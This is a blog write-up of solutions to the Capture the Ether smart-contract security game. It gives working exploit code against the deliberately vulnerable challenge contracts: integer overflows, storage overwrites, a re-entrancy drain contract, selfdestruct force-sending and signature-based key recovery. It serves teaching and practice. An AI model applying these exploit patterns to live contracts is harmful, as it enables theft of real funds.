---
title: Capture The Ether Solutions
date: 2021-01-17
image: ./featured.png
categories:
  - Tech
  - ETH
  - security
medium:
  - eos
  - Programming
  - blockchain
  - cryptocurrency
  - javascript
steem:
  - eos
  - utopian-io
  - steemdev
  - programming
  - cryptocurrency
---

[Capture the Ether](https://capturetheether.com) is a game to learn about Ethereum smart contract security.
It already launched over 2 years ago but most things you'll learn still apply today.
There even is a [leaderboard](https://capturetheether.com/leaderboard/). You still have the chance to be immortalized as one of the first 100 players to solve all challenges.
(I'm at rank 56.)
Go ahead and try it!

I solved all challenges using the modern [hardhat](https://hardhat.org/) local environment which makes forking from the ropsten test network and testing your exploits locally very easy.
My solutions [can be found here](https://github.com/MrToph/capture-the-ether).

I'll discuss all challenges in this post.

# [Warmup](https://capturetheether.com/challenges/warmup/)

## Deploy

The purpose of the first challenge is to configure your environment.
Install Metamask, create a wallet, login, and get some testnet ropsten ether.
At the time of writing, I could get testnet ether using [this faucet](https://faucet.ropsten.be/) and [this faucet](https://faucet.dimensions.network/).
Around 10 ether will be enough.

## Call Me

This challenge is easy, too. Just call the function of the deployed smart contract.
Using a hardhat test script:

```javascript
before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory =  await ethers.getContractFactory("CallMeChallenge")
  contract = factory.attach(`0x7e53cBe1AE1D8BCc1e4273ED31eb61bC4513C509`)
});

it("solves the challenge", async function () {
  const tx = await contract.callme();
  await tx.wait()
  expect(tx.hash).to.not.be.undefined
});
```

## Nickname

The last warmup challenge allows you to choose a nickname which will be shown on the leaderboard.

# [Lotteries](https://capturetheether.com/challenges/lotteries/)

The _Lotteries_ challenges are about predicting numbers which is hard on a blockchain without a built-in random number generator (because all nodes need to run the same code deterministically).

## Guess the number

The number is hardcoded in the smart contract and is `42`.

## Guess the secret number

We need to supply a number which will be hashed to match the hash stored in the contract.
Notice how the number we provide is defined as an `uint8` which is just an 8-byte integer.
We can brute-force all possible 2^8=256 numbers and compute the hash for each one of them and compare it to the smart contract hash.
This can even be done off-chain.

```javascript
const bruteForceHash = (range: number, targetHash: string) => {
  for (let i = 0; i < range; i++) {
    const hash = ethers.utils.keccak256([i]);
    if (targetHash.includes(hash)) return i;
  }
  throw new Error(`No hash found within range ${range}`);
};

const number = bruteForceHash(
  2 ** 8,
  `0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365`
);
```

## Guess the random number

Here, the answer is stored in the blockchain state (storage).
Even though the storage variable is private, all data on the blockchain is public and can still be retrieved.
Once we understand how [the storage is laid out](https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html), we see that the `answer` storage variable is stored at slot `0` which we can then query from a node or using ethers.js:

```js
const number = BigNumber.from(
  await contract.provider.getStorageAt(contract.address, 0)
)
```

## Guess the new number

The answer does not use any future blockchain state which means we can write our [own smart contract](https://github.com/MrToph/capture-the-ether/blob/master/contracts/lotteries/GuessTheNewNumberAttacker.sol#L16-L27) that just emulates the exact same steps that the challenge smart contract does and then submit our result from our contract.

```solidity
function attack() external payable {
  // simulate all steps the challenge contract does
  require(address(this).balance >= 1 ether, "not enough funds");
  uint8 answer = uint8(uint256(
    keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
  ));
  challenge.guess{value: 1 ether}(answer);

  require(challenge.isComplete(), "challenge not completed");
  // return all of it to EOA
  tx.origin.transfer(address(this).balance);
}
```

If we were to calculate this off-chain and submit the answer we would need our transaction to be mined immediately within the next block.
As we don't have much control over when our transaction is mined and included in a block, doing the computation in a proxy smart contract is the better idea.

## Predict the future

This time the answer needs to be locked in first and can only be checked after a certain number of blocks have settled.
However, the answer is only in the range of 0 to 9 because of the modulo 10 instruction:

```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
```

Also notice how the answer is the result of using `keccak256`, a hash function, which will create a random number based on the head block number.
Therefore our strategy can be as simple as:

- Lock in a guess of `0`
- Spam transactions, let them end up in different blocks and at some point the computed answer will match our `0` as it's random and in the range of `[0, 9]`.

```solidity
function lockInGuess(uint8 n) external payable {
    // need to call it from this contract because guesser is stored and checked
    // when settling
    challenge.lockInGuess{value: 1 ether}(n);
}

function attack() external payable {
    challenge.settle();

    // if we guessed wrong, revert
    require(challenge.isComplete(), "challenge not completed");
    // return all of it to EOA
    tx.origin.transfer(address(this).balance);
}

receive() external payable {}
```

## Predict the block hash

For the last challenge of this section, the answer is chosen as the block hash of a specific block.
Here, you need to know that the `blockhash` function only returns the actual block hash for the last 256 blocks due to performance reasons:

> `block.blockhash(uint blockNumber)` returns (`bytes32`): hash of the given block - only works for 256 most recent, excluding current, blocks - deprecated in version 0.4.22 and replaced by `blockhash(uint blockNumber)`.

After 256 blocks, `blockhash` returns 32 zeroes.
To solve this challenge, lock in `0x0000000000000000000000000000000000000000000000000000000000000000` and wait 257 blocks to call the `settle` action.

# [Math](https://capturetheether.com/challenges/math/)

The math section covers issues related to integer arithmetic (integer over- and underflows, integer division issues).
The challenges are thoughtfully created and have been the most interesting ones for me.

## Token sale

This challenge involves an exchange contract that buys and sells tokens for a fixed price of `1 ether`.
Our goal is to first buy tokens and then sell them for a profit.

The issue lies in the _require_ condition which is susceptible to an integer overflow:

```solidity
// 1 ether = 10^18
uint256 constant PRICE_PER_TOKEN = 1 ether;

function buy(uint256 numTokens) public payable {
    require(msg.value == numTokens * PRICE_PER_TOKEN);

    balanceOf[msg.sender] += numTokens;
}
```

Knowing that `1 ether` is just the short form of `10^18`, we can force an overflow and buy tokens at a price of `0` by choosing `numTokens` to be the max possible uint256 + 1, divided by 10^18, i.e., `2^256 / 10^18`.
The smart contract will then check if `msg.value` equals `(2^256 / 10^18) * 10^18 % 2^256 = 2^256 % 2^256 = 0` because of the overflow.

## Token whale

This challenge contract is written in a confusing way.
There is a `transferFrom` function which uses three values: `from`, `to` and `msg.sender`, but such a function really only needs to be concerned about two of these values.

```solidity
function _transfer(address to, uint256 value) internal {
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;

    emit Transfer(msg.sender, to, value);
}

function transferFrom(address from, address to, uint256 value) public {
    require(balanceOf[from] >= value);
    require(balanceOf[to] + value >= balanceOf[to]);
    require(allowance[from][msg.sender] >= value);

    allowance[from][msg.sender] -= value;
    _transfer(to, value);
}
```

We can create an accomplice to our attacker address and fully `approve(accomplice, 2^256-1)` our accomplice from the `attacker`.
Then we can call the `transferFrom(attacker, attacker, 1)` function from our `accomplice` (signed such that `msg.sender == accomplice`) with both the `from` and `to` being our attacker.
This passes the `allowance[attacker][accomplice] >= value` check and underflows the accomplice's balance `balanceOf[msg.sender] -= value <=> balanceOf[accomplice] = 0 - 1 = 2^256 - 1` in the `_transfer` helper function.

This just shows that many issues can arise when using global variables like `msg.sender` in private helper functions like `_transfer` because the control flow can't be trusted anymore.

```javascript
const eoaAddress = await eoa.getAddress();
const accompliceAddress = await accomplice.getAddress();

console.log(`Approving accomplice ...`);
tx = await contract.approve(accompliceAddress, BigNumber.from(`2`).pow(`255`));
await tx.wait()

console.log(`Transfering to self signed by accomplice ...`);
// it uses three vars: from, to, msg.sender in a wrong way
// which makes the overflow exploit possible
tx = await contractAccomplice.transferFrom(eoaAddress, eoaAddress, `1`);
await tx.wait();
// accomplice has huge amount of tokens now
console.log(`Checking accomplice balance ...`);
expect(await contract.balanceOf(accompliceAddress)).to.be.gte(
  BigNumber.from(`1000000`)
);

console.log(`Transfering funds to eoa ...`);
tx = await contractAccomplice.transfer(eoaAddress, `1000000`);
await tx.wait();
```

## Retirement fund

This challenge involves a lock-up contract where premature withdrawals involve a penalty fee.
We can collect the penalty (which is set to be all contract funds) if we pass this check:

```solidity
function collectPenalty() public {
  // ...
  uint256 withdrawn = startBalance - address(this).balance;

  // an early withdrawal occurred
  require(withdrawn > 0);

  // penalty is what's left
  msg.sender.transfer(address(this).balance);
}
```

The idea is that a penalty occurred if the start balance is less than the current balance.
However, this logic does not work in Ethereum because we can always force send ether to a contract.
Usually, sending ether to a contract requires a fallback function to be implemented, but one can force-send ether by calling the `selfdestruct` instruction on a contract containing ether.
This instruction bypasses any checks:

> The attacker can do this by creating a contract, funding it with 1 wei, and invoking `selfdestruct(victimAddress)`. No code is invoked in `victimAddress`, so it cannot be prevented. This is also true for block reward which is sent to the address of the miner, which can be any arbitrary address. Also, since contract addresses can be precomputed, ether can be sent to an address before the contract is deployed. - [ConsenSys - Secure Development Recommendations](https://consensys.github.io/smart-contract-best-practices/recommendations/#remember-that-ether-can-be-forcibly-sent-to-an-account)

A simple `selfdestruct` contract to solve this challenge looks like this:

```solidity
pragma solidity ^0.7.3;

contract RetirementFundAttacker {

    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
```

## Mapping

In this challenge, we need to set the `isComplete` variable to `true`.
It's important to understand the storage layout here.
The `isComplete` variable is defined first and occupies the first slot.
Then, a **dynamically-sized** array `uint256[] map` is defined.

> In the case of a dynamic array, the reserved slot p contains the length of the array as a uint256, and the array data itself is located sequentially at the address keccak256(p).
>
> - [Ref 1](https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#solidity-storage-layout), [Ref 2](https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html#mappings-and-dynamic-arrays)

Concretely, the contract's storage looks like this:

```python
slot 0: isComplete
slot 1: map.length
// ...
slot keccak(1): map[0]
slot keccak(1) + 1: map[1]
slot keccak(1) + 2: map[2]
slot keccak(1) + 3: map[3]
slot keccak(1) + 4: map[4]
// ...
```

Note that the array items wrap around after they reached the max storage slot of `2^256 - 1`.
Using a bit of math we can find the `map` index that writes to the `isComplete` variable at storage slot 0:

```bash
need to find array index that maps to 0 mod 2^256
i.e., keccak(1) + index mod 2^256 = 0
<=> index = -keccak(1) mod 2^256
 => index = 2^256 - keccak(1) as keccak(1) is in range
```

To solve this challenge, we first need to expand the `map`'s length to cover all `2^256 - 1` storage slots.
Then we set the map of the computed index overwriting the first storage slot.

```javascript
// all of contract storage is a 32 bytes key to 32 bytes value mapping
// first make map expand its size to cover all of this storage by setting
// key = 2^256 - 2 => map.length = 2^256 - 2 + 1 = 2^256 - 1 = max u256
// this bypasses bounds checking
tx = await contract.set(
  BigNumber.from(`2`)
    .pow(`256`)
    .sub(`2`),
  `0`
)
await tx.wait()

// map[0] value is stored at keccak(p) = keccak(1)
// needs to be padded to a 256 bit
const mapDataBegin = BigNumber.from(
  ethers.utils.keccak256(
    `0x0000000000000000000000000000000000000000000000000000000000000001`
  )
)
// need to find index at this location now that maps to 0 mod 2^256
// i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
const isCompleteOffset = BigNumber.from(`2`)
  .pow(`256`)
  .sub(mapDataBegin)

tx = await contract.set(isCompleteOffset, `1`)
await tx.wait()
```

## Donation

The issue of this challenge lies in the way the `donation` variable is defined within the `donate` function.

```solidity
struct Donation {
    uint256 timestamp;
    uint256 etherAmount;
}

// ...
Donation donation;
donation.timestamp = now;
donation.etherAmount = etherAmount;
```

If you come from a C++ background this looks like valid code to you but in Solidity this syntax creates an **uninitialized storage pointer**.
When defining structs one should always define the location, either `memory` or `storage`. When omitted, `storage` is assumed.
To stick with the C++ reference, this code can be understood as using `donation` as a reference value to storage location `0`, because it hasn't been initialized with an actual value like `donations[0]`.
Due to the way storage slots are resolved when accessing struct fields, `donation.timestamp` actually writes to the first storage slot (`0`), and `etherAmount` writes to the second storage slot (`1`), where the `owner` address is located.

So it comes down to choosing an `uint256 etherAmount` argument that equals our attacker address when interpreted. Note that an address is 160 bits so it fits in a 256-bit integer.

If we would need to send the same amount of `wei` as our address in the `etherAmount` argument, we'd need to send `~ 2^160 wei ~ 10^48 wei = 10^30 ether`.
This is obviously a lot of ether to make the exploit work, luckily there is a second bug in the calculation that determines how many `wei` we need to send:

```solidity
// 1 ether := 10**18 => scale is 10**18 * 10**18 = 10**36
uint256 scale = 10**18 * 1 ether;
require(msg.value == etherAmount / scale);
```

The `1 ether` syntax is just a macro for `10^18` itself, so it's actually dividing the `etherAmount` value by `10^36`, making the amount of `wei` needed for the exploit less than 1 ether.

```javascript
const eoaAddress = BigNumber.from(await eoa.getAddress())
tx = await contract.donate(eoaAddress.toString(), {
  value: eoaAddress.div(BigNumber.from(`10`).pow(`36`)),
})
await tx.wait()
```

## Fifty years

This is the biggest challenge in _Capture The Ether_ as it's worth 2000 points.
Practically, it's just a combination of previous challenges in this section.

It consists of a lockup contract storing a withdrawal queue. Each withdrawal takes 50 years.
The owner can either change an existing withdrawal's value in the queue or create a new withdrawal entry.
The `withdraw` function processes all matured withdrawals by iterating from the index stored in the `head` storage variable up to the `index` value passed as an argument.

The goal is to withdraw all funds without waiting.

The `else` branch of the `upsert` function uses an uninitialized storage pointer again as in the _Donation_ challenge.
This is the heart of the attack and enables overwriting the `queue.length` and `head` storage variables:

```solidity
function upsert(uint256 index, uint256 timestamp) public payable {
  // ...
  } else {
      // Append a new contribution. Require that each contribution unlock
      // at least 1 day after the previous one.
      require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

      contribution.amount = msg.value; // @note: writes to queue.length
      contribution.unlockTimestamp = timestamp; // @note: writes to head
      // @note: push increases queue.length by 1
      // @note: THEN pushes contribution which means that
      // @note: contribution.amount = msg.value + 1
      queue.push(contribution);
  }
```

If we can bypass the `timestamp` check, our `timestamp` argument is being written to the `head` variable (slot `1`).
The `contribution.amount = msg.value` assignment writes to storage slot 0, where `queue.length` is stored.
Then this contribution object with its actual values is pushed to the `queue`.
An important thing to note is that because of the internal instruction order in the `queue.push` function, the queue's length is **first** incremented, and then the queue entry is copied. As `queue` is just a struct pointer to storage slot 0 and 1, and storage slot 1, the queue's length, has been incremented, the queue entry's `amount` is actually `msg.value + 1` - not `msg.value` as is written in the code.

Knowing all of this, we want to call the `withdraw` function with an index where the corresponding queue item has an `unlockTimestamp` in the past.
We can launch the following attack:

1) First, we create a new queue entry calling `upsert` preparing a bypass to the `timestamp` check. We choose the `timestamp` value such that it would overflow `queue[queue.length - 1].unlockTimestamp + 1 days` in a way to equal zero.

    ```javascript
    const ONE_DAYS_IN_SECONDS = 24 * 60 * 60
    const DATE_OVERFLOW = BigNumber.from(`2`)
      .pow(`256`)
      .sub(ONE_DAYS_IN_SECONDS)
    tx = await contract.upsert(`1`, DATE_OVERFLOW.toString(), {
      value: `1`,
    })
    ```

    The contract's storage is now:

    | Var          | Value                                                                          |
    | ------------ | ------------------------------------------------------------------------------ |
    | queue.length | 2                                                                              |
    | head         | 115792089237316195423570985008687907853269984665640564039457584007913129553536 |
    | balance      | 1                                                                              |

2) Our `head` variable is a garbage value and we need to reset it to `0` so we can `withdraw` the first entry with the 1 ether amount. We chose the previously added queue item in a way such that it overflows the `timestamp` check when we call `upsert` a second time with `timestamp = 0`. This resets the `head` pointer to zero and pushes a queue item with a timestamp in the past.

    ```javascript
    const ZERO = `0` // will be head value
    tx = await contract.upsert(`2`, ZERO, {
      value: `2`,
    })
    ```

    | Var          | Value |
    | ------------ | ----- |
    | queue.length | 3     |
    | head         | 0     |
    | balance      | 3     |

3) Finally, we'd like to call `withdraw(2)` now but it would fail at this point because it tries to withdraw too much. As mentioned, when we call `upsert` with `msg.value`, the pushed queue item is stored with an amount of `msg.value + 1`, which means the contract will revert the transaction as it's missing two wei (we called `upsert` twice). We can re-use our force-send contract of the _Retirement fund_ challenge to send the missing two wei to the contract. Then our `withdraw(2)` call passes and withdraws all tokens from the contract, solving the challenge.

    ```javascript
    // we cannot withdraw all of it now because the contract only contains 1 + 2 = 3 wei
    // but new queue items' .amount sums up to 2 + 3 = 5 wei
    // so need to add at least 2 more wei
    // use a selfdestruct wei transfer bypass first to get to the correct balance
    const attackerFactory = await ethers.getContractFactory("RetirementFundAttacker");
    attacker = await attackerFactory.deploy(contract.address, {
      value: ethers.utils.parseUnits(`2`, `wei`)
    });
    await eoa.provider!.waitForTransaction(attacker.deployTransaction.hash)

    // trigger head overflow, use just inserted contribution (index 2) to bypass
    // timestamp check and withdraw from head=0..2=index
    tx = await contract.withdraw(`2`);
    ```


# [Accounts](https://capturetheether.com/challenges/accounts/)

The accounts challenges require knowledge about the cryptography part of Ethereum, including elliptic curve cryptography and the ECDSA signing algorithm.
They are not related to smart contract vulnerabilities.

## Fuzzy Identity

In this challenge, we need to create a contract that has a special `name` function that returns `smarx`. This condition is easy to satisfy.
The second condition is that the smart contract's address must contain the hex string `badc0de`.

This challenge basically asks you to create _vanity_ addresses.
The only way to solve this challenge is by brute-forcing lots of contract addresses until you end up with one that contains the target string.

Smart contract addresses are fully derived by the deployment **transaction sender address** and the **transaction's nonce**.
As we don't want to wait with deploying the smart contract we set the nonce to zero (an account's first address) and brute force fresh externally owned account addresses.

```javascript
const findMatchingPrivateKey = () => {
  const NONCE = BigNumber.from(`0`);
  let foundKey: HDNode | undefined = undefined;
  // choose 512 bits of randomness like BIP39 would for when deriving seed from mnemonic
  // this is probably very inefficient compared to just deriving a key from randomness
  // as it involves several hash functions when deriving the key from index
  const masterKey = ethers.utils.HDNode.fromSeed(crypto.randomBytes(512 / 8));
  const getPathForIndex = (index: number) => `m/44'/60'/0'/0/${index}`;

  let counter = 0;

  while (!foundKey) {
    const key = masterKey.derivePath(getPathForIndex(counter));
    const from = key.address;
    const contractAddr = ethers.utils.getContractAddress({
      from,
      nonce: NONCE,
    });
    if (contractAddr.toLowerCase().includes(`badc0de`)) {
      foundKey = key;
    }

    counter++;
    if (counter % 1000 == 0) {
      console.log(`Checked ${counter} addresses`);
    }
  }

  return foundKey.privateKey;
};
```

Note that `badc0de` appearing at a specific location of the address has a probability of `16^7`.
As the string is allowed to appear anywhere this is reduced to about `16 ^ 7 / 34 ~ 7,895,160`.
This challenge indeed took a very long time for me, I let it run for just under a day before finding a key.
In the meantime, you can go ahead and solve the other challenges.

## Public Key

The goal of this challenge is to retrieve the public key of the `owner` account that we have no control over.

```solidity
function authenticate(bytes publicKey) public {
    require(address(keccak256(publicKey)) == owner);

    isComplete = true;
}
```

The address is correctly computed from the public key as the keccak hash of the public key - the same as Ethereum does it.
As transactions are signed by the account, they come with a signature and this signature needs to contain a public key for everyone to verify that the transaction originated from this account. Or, in the case of ECDSA, the public key is not actually part of the signature but can be recovered from the message and the signature.

Luckily the `owner` account has a [single outgoing transaction](https://ropsten.etherscan.io/tx/0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb).
We can use a node to get its data, recompute the message hash, and recover the public key of the address.

```javascript
const firstTxHash = `0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb`;
const firstTx = await eoa.provider.getTransaction(firstTxHash);
expect(firstTx).not.to.be.undefined;
console.log(`firstTx`, JSON.stringify(firstTx, null, 4));
// ...
// signature values
// "r": "0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7",
// "s": "0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962",
// "v": 41,
```

An ECDSA signature consists of the `(r,s,v)` values but _what_ is actually being signed?
Ethereum signs the **serialized transaction hash** according to [EIP 155](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md) which is `keccak256(rlp(nonce, gasprice, startgas, to, value, data, chainid, 0, 0))`.

> This hash is **not** what is commonly referred to as the _transaction hash_. The transaction hash further includes the actual signature values which are of course not known at the point of the signature creation.

Using ethers.js, we can create the correct **recursive-length-prefix (rlp) encoding** of the ordered arguments by serializing the transaction:

```javascript
const txData = {
  gasPrice: firstTx.gasPrice,
  gasLimit: firstTx.gasLimit,
  value: firstTx.value,
  nonce: firstTx.nonce,
  data: firstTx.data,
  to: firstTx.to,
  chainId: firstTx.chainId,
};
const signingData = ethers.utils.serializeTransaction(txData);
const msgHash = ethers.utils.keccak256(signingData);
```

Another call to `recoverPublicKey` results in the uncompressed public key which we can submit to solve this challenge.

```javascript
const signature = { r: firstTx.r, s: firstTx.s, v: firstTx.v };
let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);
// const compressedPublicKey = ethers.utils.computePublicKey(rawPublicKey, true);
// need to strip of the 0x04 prefix indicating that it's a raw public key
expect(rawPublicKey.slice(2, 4), "not a raw public key").to.equal(`04`);
rawPublicKey = `0x${rawPublicKey.slice(4)}`;
console.log(`Recovered public key ${rawPublicKey}`);
// 0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4

tx = await contract.authenticate(rawPublicKey);
```


> An interesting result of all this is that if you never **send** a transaction from your account, the only thing that is visible on the blockchain is your address - a sha256 hash. This makes accounts that never sent a transaction quantum-secure.

## Account Takeover

This challenge is similar to the previous one, this time we need to retrieve the actual private key to imitate a transaction from the `owner` contract.

The only clue we have is the address of the `owner`. After checking the accounts transactions one might notice that there are two transactions using the same `r` value in their signature (`k` value in ECDSA).

What you need to know about ECDSA is that the `k` value is supposed to be chosen at random and may not be reused. Using the same `k` value twice for signing different messages allows one to recompute the private key.
This is even stated on [ECDSA's Wikipedia page](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm) and could be observed in the infamous Sony root signing key leak from 2010.

```javascript
const owner = `0x6B477781b0e68031109f21887e6B5afEAaEB002b`;
// pick the only outgoing tx
// https://ropsten.etherscan.io/tx/0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb
const tx1Hash = `0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396`;
const tx2Hash = `0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009`;
const tx1 = await eoa.provider.getTransaction(tx1Hash);
const tx2 = await eoa.provider.getTransaction(tx2Hash);
expect(tx1).not.to.be.undefined;
expect(tx2).not.to.be.undefined;
console.log(`TX 1`, JSON.stringify(tx1, null, 4));
console.log(`TX 2`, JSON.stringify(tx2, null, 4));

// this makes exploit possible, same r (derived from k)
expect(tx1.r).to.eq(tx2.r)
```

I won't cover the math and details on how to recover the private key using these two signatures - there are already [great write-ups](https://bitcoin.stackexchange.com/questions/35848/recovering-private-key-when-someone-uses-the-same-k-twice-in-ecdsa-signatures) on this ECDSA quirk. 

# [Miscellaneous](https://capturetheether.com/challenges/miscellaneous/)

## Assume ownership

What looks like the constructor is just a misspelt function `AssumeOwmershipChallenge` that can be called by anyone to claim ownership.

## Token bank

This challenge involves a custom token bank contract that internally uses an ERC-223 token. The difference between the usual ERC-20 and ERC-223 token standards is that the latter "notifies" the recipient of a transfer by calling the recipient's `tokenFallback` function in case it is a contract.

```solidity
function transfer(address to, uint256 value, bytes data) public returns (bool) {
    require(balanceOf[msg.sender] >= value);

    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;
    emit Transfer(msg.sender, to, value);

    if (isContract(to)) {
        ITokenReceiver(to).tokenFallback(msg.sender, value, data);
    }
    return true;
}
```

The token bank uses the token contract in a wrong way which opens the contract up for a re-entrancy vulnerability.


```solidity
function withdraw(uint256 amount) public {
    require(balanceOf[msg.sender] >= amount);

    require(token.transfer(msg.sender, amount));
    // balance decreased after recipient is notified
    // re-entrancy issue
    balanceOf[msg.sender] -= amount;
}
```

The balance is updated after calling the `token.transfer` function allowing us to repeatedly withdraw our deposited funds each time.
The re-entrancy control flow will be `challenge.withdraw => token.transfer => msg.sender.tokenFallback() => ... repeat until empty`.

Here's the attacker contract facilitating all of this.

```solidity
contract TokenBankAttacker {
    ITokenBankChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = ITokenBankChallenge(challengeAddress);
    }

    function deposit() external payable {
        uint256 myBalance = challenge.token().balanceOf(address(this));
        // deposit is handled in challenge's tokenFallback
        challenge.token().transfer(address(challenge), myBalance);
    }

    function attack() external payable {
        callWithdraw();
        // if something went wrong, revert
        require(challenge.isComplete(), "challenge not completed");
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes calldata
    ) external {
        require(
            msg.sender == address(challenge.token()),
            "not from original token"
        );

        // when attacker EOA deposits, ignore
        if (from != address(challenge)) return;

        callWithdraw();
    }

    function callWithdraw() private {
        // this one is the bugged one, does not update after withdraw
        uint256 myInitialBalance = challenge.balanceOf(address(this));
        // this one from the token contract, updates after withdraw
        uint256 challengeTotalRemainingBalance =
            challenge.token().balanceOf(address(challenge));
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                myInitialBalance < challengeTotalRemainingBalance
                    ? myInitialBalance
                    : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }
}
```

At each recursion, we check if the contract is already empty. If not we compute the max amount of tokens we can withdraw, either our initial deposit or what's left in the contract.

# Source code

> ❕ The full code for all solutions can be [found on GitHub](https://github.com/MrToph/capture-the-ether).

- [Damn Vulnerable DeFi](/damn-vulnerable-de-fi-solutions/)
- [Ethernaut](/ethernaut-solutions/)
- Capture The Ether
